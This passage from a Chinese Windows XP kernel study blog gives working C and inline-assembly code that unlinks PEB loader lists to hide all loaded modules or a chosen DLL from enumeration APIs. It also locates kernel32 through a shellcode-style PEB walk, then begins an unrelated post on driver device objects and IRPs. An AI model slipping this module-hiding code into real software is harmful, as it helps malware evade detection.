_LIST_ENTRY [ <span class="number">0x7c99b2d8</span> - <span class="number">0x7c99b2d8</span> ]</span><br><span class="line">   +<span class="number">0x03c</span> SectionPointer   : <span class="number">0x7c99b2d8</span> Void</span><br><span class="line">   +<span class="number">0x040</span> CheckSum         : <span class="number">0x7c99b2d8</span></span><br><span class="line">   +<span class="number">0x044</span> TimeDateStamp    : <span class="number">0x61e7f524</span></span><br><span class="line">   +<span class="number">0x044</span> LoadedImports    : <span class="number">0x61e7f524</span> Void</span><br><span class="line">   +<span class="number">0x048</span> EntryPointActivationContext : (null) </span><br><span class="line">   +<span class="number">0x04c</span> PatchInformation : (null) </span><br></pre></td></tr></table></figure>



<p>有大佬总结在Win XP和Win7下，<code>InLoadOrderModuleList</code>指向的模块按照顺序：第一个是EXE模块本身，第二个是NTDLL.DLL，第三个是KERNEL32.DLL。这样，KERNEL32.DLL的顺序是不是又固定了呢？实际上这样也并非能在任何场景下通用，还是老老实实拿着模块名称来遍历查询的ShellCode才通用。（可参考：<a href="https://www.cnblogs.com/bokernb/p/6404795.html">PEB及LDR链</a>最后一段。）</p>
<p><img data-src="https://s2.loli.net/2022/01/19/HSEWsYBdh7bpizI.png" alt="25.png"></p>
<p>图片来源：<a href="https://www.cnblogs.com/thresh/p/12609659.html">Window中的shellcode编写框架（入门篇）</a></p>
<h3 id="3-2-断链原理"><a href="#3-2-断链原理" class="headerlink" title="3.2 断链原理"></a>3.2 断链原理</h3><p>模块断链只是隐藏起来不让API查到，但是正常的功能不受影响。</p>
<p>3环下PEB断链是一种常见的模块隐藏技术，原理是修改<code>_PEB_LDR_DATA</code>中的三个双向链表，删除链表中的项，让 <code>CreateToolhelp32Snapshot</code>之类的API无法通过模块列表枚举DLL。</p>
<p>结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">　+<span class="number">0x00</span>	ULONG Length;</span><br><span class="line">　+<span class="number">0x04</span>	BOOLEAN Initialized; </span><br><span class="line">　+<span class="number">0x08</span>	PVOID SsHandle;</span><br><span class="line">　+<span class="number">0x0c</span>	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">　+<span class="number">0x14</span>	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">　+<span class="number">0x1c</span>	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">  +<span class="number">0x24</span>	PVOID EntryInProgress;</span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>需要注意的三个结构：</p>
<ul>
<li>InLoadOrderModuleList ：描述<strong>当前进程中</strong>模块的加载顺序</li>
<li>InMemoryOrderModuleList：所有模块在内存中的顺序</li>
<li>InInitializationOrderModuleList ：所有模块初始化的顺序</li>
</ul>
<h3 id="3-2-代码：隐藏所有模块"><a href="#3-2-代码：隐藏所有模块" class="headerlink" title="3.2 代码：隐藏所有模块"></a>3.2 代码：隐藏所有模块</h3><div class="note info"><p>所谓断链，就是把三个链表断掉，让3环的API读不出模块信息。最简单的做法就是让当前进程的Flink和Blink指向它自己。</p>
<p>⚠️注意：要隐藏模块，则这个模块在这三个结构中都要断开。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核Unicode字符串</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    PVOID SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID EntryInProgress; </span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">HideModule</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;未断链\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	HideModule();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;断链后\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID <span class="title">HideModule</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PPEB_LDR_DATA Ldr = <span class="literal">NULL</span>;</span><br><span class="line">  PLIST_ENTRY Head = <span class="literal">NULL</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    pushad;</span><br><span class="line">    mov eax, fs:[<span class="number">30</span>h];	<span class="comment">//eax 指向PEB</span></span><br><span class="line">    mov eax, [eax+<span class="number">0xc</span>]	<span class="comment">//eax 指向PEB_LDR_DATA </span></span><br><span class="line">    mov Ldr, eax;</span><br><span class="line">    popad;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  Head = Ldr-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">  Head-&gt;Flink = Head;</span><br><span class="line">  Head-&gt;Blink = Head;</span><br><span class="line"></span><br><span class="line">  Head = Ldr-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">  Head-&gt;Flink = Head;</span><br><span class="line">  Head-&gt;Blink = Head;</span><br><span class="line"></span><br><span class="line">  Head = Ldr-&gt;InInitializationOrderModuleList.Flink;</span><br><span class="line">  Head-&gt;Flink = Head;</span><br><span class="line">  Head-&gt;Blink = Head;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行环境：Windows7 SP1 x64，VC6++</p>
<p>断链前：</p>
<p><img data-src="https://s2.loli.net/2022/01/19/LdJzAtlMWf8jXk2.png" alt="26.png"></p>
<p>断链后：</p>
<p><img data-src="https://s2.loli.net/2022/01/19/BfJVO62pFlYxHMR.png" alt="27.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//内嵌汇编获取Kernel32的地址</span></span><br><span class="line">__declspec(naked) <span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax,fs:[<span class="number">30</span>h]	<span class="comment">//eax 指向PEB</span></span><br><span class="line">        mov eax,[eax+<span class="number">0</span>ch]	<span class="comment">//eax 指向PEB_LDR_DATA</span></span><br><span class="line">        mov eax,[eax+<span class="number">14</span>h]	<span class="comment">//eax 指向InMemoryOrderModuleList</span></span><br><span class="line">        mov eax,[eax]		<span class="comment">//eax 指向LDR-&gt;指向InMemoryOrderModuleList.Flink</span></span><br><span class="line">        mov eax,[eax]		<span class="comment">//eax 指向当前模块的地址</span></span><br><span class="line">        mov eax,[eax+<span class="number">10</span>h]<span class="comment">//eax 指向第五个模块</span></span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//kernel32.dll 基址的动态获取</span></span><br><span class="line">    HMODULE hLoadLibrary = LoadLibraryA(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="comment">//使用内嵌汇编来获取基址</span></span><br><span class="line">    HMODULE _hLoadLibrary = (HMODULE)getKernel32();</span><br><span class="line">    <span class="comment">//效果是一样的</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LoadLibraryA动态获取的地址: 0x%x\n&quot;</span>, hLoadLibrary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;内嵌汇编获取的地址: 0x%x\n&quot;</span>, _hLoadLibrary);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="3-3-代码：隐藏指定模块"><a href="#3-3-代码：隐藏指定模块" class="headerlink" title="3.3 代码：隐藏指定模块"></a>3.3 代码：隐藏指定模块</h3><p>隐藏本进程的<code>kernel32.dll</code>模块。</p>
<p>  方案1：在PEB_LDR_DATA断开：<br>    <code>InLoadOrderModuleList</code><br>    <code>InMemoryOrderModuleList</code><br>    <code>InInitializationOrderModuleList</code><br>    这种和方案3实质是一样的</p>
<p>  方案2：在三个List的<code>LDR_DATA_TABLE_ENTRY</code>仅断开<code>InLoadOrderLinks</code>，不可行。</p>
<p>  方案3：在LDR_DATA_TABLE_ENTRY里断开对应的：<br>    <code>InLoadOrderLinks</code><br>    <code>InMemoryOrderLinks</code><br>    <code>InInitializationOrderLinks</code></p>
<p>经过实际代码运行分析，有这样的对应关系：</p>
<ul>
<li><code>InLoadOrderModuleList-&gt;Flink == InLoadOrderLinks</code></li>
<li><code>InMemoryOrderModuleList-&gt;Flink == InMemoryOrderLinks</code></li>
<li><code>InInitializationOrderModuleList-&gt;Flink == InInitializationOrderLinks</code></li>
</ul>
<p>示意图如下：</p>
<p><img data-src="https://s2.loli.net/2022/03/04/FwiL8n25oS7sBOr.png" alt="30_1.png"></p>
<p>由上图可知，<code>InLoadOrderModuleList-&gt;Flink == InLoadOrderLinks</code>与其他两个不一定在同一个结构体中。且都是对应指过去。</p>
<p>故如下代码注释可以改为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Ldte = (PLDR_DATA_TABLE_ENTRY)pTemp;</span><br><span class="line">Ldte = (PLDR_DATA_TABLE_ENTRY)(pTemp - <span class="number">0x8</span>);</span><br><span class="line">Ldte = (PLDR_DATA_TABLE_ENTRY)(pTemp - <span class="number">0x10</span>);</span><br></pre></td></tr></table></figure>

<p><strong>因为：</strong><code>InLoadOrderModuleList</code>既是<code>LIST_ENTRY</code>结构，也是<code>LDR_DATA_TABLE_ENTRY</code>结构，而<code>InLoadOrderLinks</code>仅为<code>LIST_ENTRY</code>结构。由于对应结构都是一一指向过去，拿<code>InMemoryOrderList</code>举例，其<code>InMemoryOrderList.Flink == InMemoryOrderLinks</code>，相对于<code>LDR_DATA_TABLE_ENTRY</code>结构偏移量为0x8。</p>
<p>⚠️：InLoadOrderModule<strong>List</strong>不同InMemoryOrder<strong>Links</strong>。InLoadOrderModule<strong>List</strong>.Flink为当前模块的<code>LDR_DATA_TABLE_ENTRY</code>，InMemoryOrder<strong>Links</strong>.Flink为下一个模块的<code>LIST_ENTRY</code>。</p>
<p>隐藏模块代码如下（如果题目改为隐藏除了<code>kernel32.dll</code>外的所有模块，只需要将<code>UnicodeStringCMP</code>函数比较结果取反即可）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核Unicode字符串</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    PVOID SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID EntryInProgress; </span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">     LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     WORD LoadCount;</span><br><span class="line">     WORD TlsIndex;</span><br><span class="line">     <span class="comment">//后面的成员暂时用不到，就不列举了</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">HideOneModule</span><span class="params">(PWSTR pMoudleName)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">UnicodeStringCMP</span><span class="params">(PWSTR Sting_1, PWSTR Sting_2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;隐藏模块kernel32.dll前\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	HideOneModule(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;隐藏模块kernel32.dll后\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">HideOneModule</span><span class="params">(PWSTR pMoudleName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PPEB_LDR_DATA Ldr = <span class="literal">NULL</span>;</span><br><span class="line">  PLIST_ENTRY Head = <span class="literal">NULL</span>;</span><br><span class="line">  PLIST_ENTRY pTemp = <span class="literal">NULL</span>;</span><br><span class="line">  PLDR_DATA_TABLE_ENTRY Ldte = <span class="literal">NULL</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    pushad;</span><br><span class="line">    mov eax, fs:[<span class="number">30</span>h];	<span class="comment">//eax 指向PEB</span></span><br><span class="line">    mov eax, [eax+<span class="number">0xc</span>]	<span class="comment">//eax 指向PEB_LDR_DATA </span></span><br><span class="line">    mov Ldr, eax;</span><br><span class="line">    popad;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Head = &amp;(Ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">  pTemp = Head-&gt;Flink;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Ldte = (PLDR_DATA_TABLE_ENTRY)pTemp;	//当前模块</span></span><br><span class="line">		Ldte = CONTAINING_RECORD(pTemp, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);</span><br><span class="line">		<span class="keyword">if</span>(UnicodeStringCMP(Ldte-&gt;BaseDllName.Buffer, pMoudleName))</span><br><span class="line">		&#123;</span><br><span class="line">			Ldte-&gt;InLoadOrderLinks.Blink-&gt;Flink = Ldte-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">			Ldte-&gt;InLoadOrderLinks.Flink-&gt;Blink = Ldte-&gt;InLoadOrderLinks.Blink;	</span><br><span class="line">		&#125;</span><br><span class="line">		pTemp = pTemp-&gt;Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(Head != pTemp);</span><br><span class="line"></span><br><span class="line">  Head = &amp;(Ldr-&gt;InMemoryOrderModuleList);</span><br><span class="line">  pTemp = Head-&gt;Flink;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Ldte = (PLDR_DATA_TABLE_ENTRY)pTemp;	</span></span><br><span class="line">		Ldte = CONTAINING_RECORD(pTemp, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">		<span class="keyword">if</span>(UnicodeStringCMP(Ldte-&gt;BaseDllName.Buffer, pMoudleName))</span><br><span class="line">		&#123;</span><br><span class="line">			Ldte-&gt;InMemoryOrderLinks.Blink-&gt;Flink = Ldte-&gt;InMemoryOrderLinks.Flink;  </span><br><span class="line">			Ldte-&gt;InMemoryOrderLinks.Flink-&gt;Blink = Ldte-&gt;InMemoryOrderLinks.Blink;	</span><br><span class="line">		&#125;</span><br><span class="line">		pTemp = pTemp-&gt;Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(Head != pTemp);</span><br><span class="line"></span><br><span class="line">  Head = &amp;(Ldr-&gt;InInitializationOrderModuleList);</span><br><span class="line">  pTemp = Head-&gt;Flink;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Ldte = (PLDR_DATA_TABLE_ENTRY)pTemp;	</span></span><br><span class="line">		Ldte = CONTAINING_RECORD(pTemp, LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks);</span><br><span class="line">		<span class="keyword">if</span>(UnicodeStringCMP(Ldte-&gt;BaseDllName.Buffer, pMoudleName))</span><br><span class="line">		&#123;</span><br><span class="line">			Ldte-&gt;InInitializationOrderLinks.Blink-&gt;Flink = Ldte-&gt;InInitializationOrderLinks.Flink;  </span><br><span class="line">			Ldte-&gt;InInitializationOrderLinks.Flink-&gt;Blink = Ldte-&gt;InInitializationOrderLinks.Blink;	</span><br><span class="line">		&#125;</span><br><span class="line">		pTemp = pTemp-&gt;Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(Head != pTemp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//字符串比较函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnicodeStringCMP</span><span class="params">(PWSTR Sting_1, PWSTR Sting_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (*Sting_1)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (*Sting_1 != *Sting_2)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		Sting_1++;</span><br><span class="line">		Sting_2++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行环境：Windows7 SP1 x64，VC6++</p>
<p>隐藏模块kernel32.dll前：</p>
<p><img data-src="https://s2.loli.net/2022/01/20/bexjKra2ZDINPEo.png" alt="28.png"></p>
<p>隐藏模块kernel32.dll后：</p>
<p><img data-src="https://s2.loli.net/2022/01/20/Rd6YH9gJO7ZxhpU.png" alt="29.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>WinXP驱动</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
        <tag>PEB断链</tag>
        <tag>3环模块隐藏</tag>
        <tag>0环模块隐藏</tag>
        <tag>特征码搜索</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 驱动开发（三）</title>
    <url>/post/WinXP-Driver3/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-0环与3环通信常规方式"><a href="#1-0环与3环通信常规方式" class="headerlink" title="1 0环与3环通信常规方式"></a>1 0环与3环通信常规方式</h2><p>在驱动中，如果想与3环的程序进行交互，就必须得有设备对象。</p>
<p>本文讲常规的通信方式，通常程序开发使用该方式，非常规方式在这里：<a href="https://blog.csdn.net/Kwansy/article/details/109774674">0环与3环通信非常规方式 —— 0环InlineHook</a>。</p>
<h3 id="1-1-设备对象"><a href="#1-1-设备对象" class="headerlink" title="1.1 设备对象"></a>1.1 设备对象</h3><p>我们在开发窗口程序的时候，消息被封装成一个结构体：<strong>MSG</strong>，在内核开发时，消息被封装成另外一个结构体：<strong>IRP</strong>（I&#x2F;O Request Package）。</p>
<p>在窗口程序中，能够接收消息的只能是窗口对象。在内核中，能够接收IRP消息的只能是设备对象。当上层应用程序需要访问底层输入输出设备时，发出<code>I/O</code>请求，系统会把这些请求转化为<code>IRP</code>数据，不同的<code>IRP</code>会启动<code>I/O</code>设备驱动中对应的派遣函数。</p>
<p><img data-src="https://s2.loli.net/2022/01/17/Fm1o29Ix87wnlWi.png" alt="20.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMSG</span> &#123;</span></span><br><span class="line">    HWND        hwnd;		<span class="comment">//该消息所属的窗口句柄</span></span><br><span class="line">    UINT        message;	<span class="comment">//指定消息的类型</span></span><br><span class="line">    WPARAM      wParam;		<span class="comment">//用于指定消息的附加信息，根据消息不同，代表不同意思</span></span><br><span class="line">    LPARAM      lParam;		<span class="comment">//用于指定消息的附加信息，根据消息不同，代表不同意思</span></span><br><span class="line">    DWORD       time;		<span class="comment">//该消息投递到消息列队当中的时间</span></span><br><span class="line">    POINT       pt;		<span class="comment">//该消息投递到消息列队当时，鼠标的当前位置</span></span><br><span class="line">&#125; MSG, *PMSG, NEAR *NPMSG, FAR *LPMSG;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _IRP</span><br><span class="line">nt!_IRP</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B</span><br><span class="line">   +<span class="number">0x002</span> Size             : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> MdlAddress       : Ptr32 _MDL</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> AssociatedIrp    : __unnamed</span><br><span class="line">   +<span class="number">0x010</span> ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> IoStatus         : _IO_STATUS_BLOCK</span><br><span class="line">   +<span class="number">0x020</span> RequestorMode    : Char</span><br><span class="line">   +<span class="number">0x021</span> PendingReturned  : UChar</span><br><span class="line">   +<span class="number">0x022</span> StackCount       : Char</span><br><span class="line">   +<span class="number">0x023</span> CurrentLocation  : Char</span><br><span class="line">   +<span class="number">0x024</span> Cancel           : UChar</span><br><span class="line">   +<span class="number">0x025</span> CancelIrql       : UChar</span><br><span class="line">   +<span class="number">0x026</span> ApcEnvironment   : Char</span><br><span class="line">   +<span class="number">0x027</span> AllocationFlags  : UChar</span><br><span class="line">   +<span class="number">0x028</span> UserIosb         : Ptr32 _IO_STATUS_BLOCK</span><br><span class="line">   +<span class="number">0x02c</span> UserEvent        : Ptr32 _KEVENT</span><br><span class="line">   +<span class="number">0x030</span> Overlay          : __unnamed</span><br><span class="line">   +<span class="number">0x038</span> CancelRoutine    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x03c</span> UserBuffer       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> Tail             : __unnamed</span><br></pre></td></tr></table></figure>

<h3 id="1-2-创建设备对象"><a href="#1-2-创建设备对象" class="headerlink" title="1.2 创建设备对象"></a>1.2 创建设备对象</h3><p>使用<code>IoCreateDevice</code>函数在0环来创建一个设备对象。</p>
<p>驱动程序原本的目的是用来控制硬件，但我们也可以用驱动做一些安全相关的事情，因为驱动运行在0环。为了控制驱动运行，我们需要在3环向驱动发数据，所以我们需要有一种方法来建立0环到3环的通信。本文介绍常规方式，也就是创建设备对象的方式。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建设备名称</span></span><br><span class="line">UNICODE_STRING Devicename;</span><br><span class="line">RtlInitUnicodeString(&amp;Devicename,<span class="string">L&quot;\\Device\\MyDevice&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           PDRIVER_OBJECT  DriverObject,		<span class="comment">//当前设备所属的驱动对象</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, optional] PUNICODE_STRING DeviceName,		<span class="comment">//设备对象的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out]          PDEVICE_OBJECT  *DeviceObject		<span class="comment">//设备对象指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-0环与3环数据交互方式"><a href="#1-3-0环与3环数据交互方式" class="headerlink" title="1.3 0环与3环数据交互方式"></a>1.3 0环与3环数据交互方式</h3><p>设备对象的<strong>Flags</strong>（UINT32）成员决定0环和3环进行数据交互的方式，分以下3种：</p>
<ol>
<li><strong>缓冲区方式读写</strong>（<code>DO_BUFFERED_IO</code>）：操作系统将应用程序提供缓冲区的数据复制到内核模式下的地址中。实质上是：将3环一个缓冲区的内容复制到0环的缓冲区（数据量小时好用，但是交互慢）。</li>
<li><strong>直接方式读写</strong>（<code>DO_DIRECT_IO</code>）：操作系统会将用户模式下的缓冲区锁住。然后操作系统将这段缓冲区在内核模式地址再次映射一遍。这样，用户模式的缓冲区和内核模式的缓冲区指向的是同一区域的物理内存。缺点就是要单独占用物理页面。<strong>0环和3环线性地址指向同一块物理页</strong>（数据量大时好用，但是物理页不允许换页，如写入文件）。</li>
<li><strong>其他方式读写</strong>：在0环直接读3环的线性地址，不建议使用。在调用<code>IoCreateDevice</code>创建设备后对<code>pDevObj-&gt;Flags</code>即不设置DO_BUFFERED_IO也不设置DO_DIRECT_IO此时就是其他方式。</li>
</ol>
<blockquote>
<p>在使用其他方式读写设备时，派遣函数直接读写应用程序提供的缓冲区地址。在驱动程序中，直接操作应用程序的缓冲区地址是很危险的。只有驱动程序与应用程序运行在相同线程上下文的情况下，才能使用这种方式。</p>
</blockquote>
<p>使用方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br></pre></td></tr></table></figure>



<h3 id="1-4-创建符号链接"><a href="#1-4-创建符号链接" class="headerlink" title="1.4 创建符号链接"></a>1.4 创建符号链接</h3><p>创建符号链接目的是：在3环不能直视使用设备名称进行数据交互，需要在0环将设备对象链接到一个符号上去，然后在3环通过这个符号进行数据交互。</p>
<div class="note danger"><p>特别说明：<br>1、设备名称的作用是给内核对象用的，如果要在Ring3访问，必须要有符号链接。其实就是一个别名，没有这个别名，在Ring3不可见。<br>2、内核模式下，符号链接是以<code>\??\</code>开头的，如C 盘就是<code>\??\C:</code>。<br>3、而在用户模式下，则是以<code>\\.\</code>开头的，如C 盘就是<code>\\.\C:</code>。</p>
